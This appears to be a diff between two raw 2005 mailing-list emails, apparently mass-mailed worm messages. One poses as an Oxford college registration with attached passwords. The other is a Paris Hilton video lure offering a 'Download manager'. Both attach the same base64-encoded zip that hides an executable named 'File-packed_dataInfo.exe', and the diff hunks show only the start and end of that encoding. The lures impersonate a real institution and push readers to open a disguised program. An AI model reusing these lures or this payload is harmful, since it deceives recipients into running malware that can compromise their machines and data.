@@ -1,29 +1,30 @@
-From: webmaster@christ-church.oxford.ac.uk
-Subject: Registration_Confirmation
-Date: Tue, 20 Dec 2005 09:44:35 UTC
-Message-ID: <ecddc.18dc6cb2efae@christ-church.oxford.ac.uk>
+From: info@elender.hu
+Subject: Paris_Hilton_&_Nicole_Richie
+Date: Tue, 20 Dec 2005 09:52:37 UTC
+Message-ID: <0b8b3d73.ddddf917b@elender.hu>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="==57bfd527c6a010.9df56d0ca9"
+Content-Type: multipart/mixed; boundary="===ff00456.1dbbb0affd2bb2"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: netdev-bounce@oss.sgi.com
+To: netdev@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---==57bfd527c6a010.9df56d0ca9
+--===ff00456.1dbbb0affd2bb2
 
-Account and Password Information are attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.christ-church.oxford.ac.uk
-***** Email: postman@christ-church.oxford.ac.uk
---==57bfd527c6a010.9df56d0ca9
-Content-Type: application/octet-stream; name=reg_pass.zip
+Please use our Download manager.
+--===ff00456.1dbbb0affd2bb2
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---==57bfd527c6a010.9df56d0ca9--
+--===ff00456.1dbbb0affd2bb2--
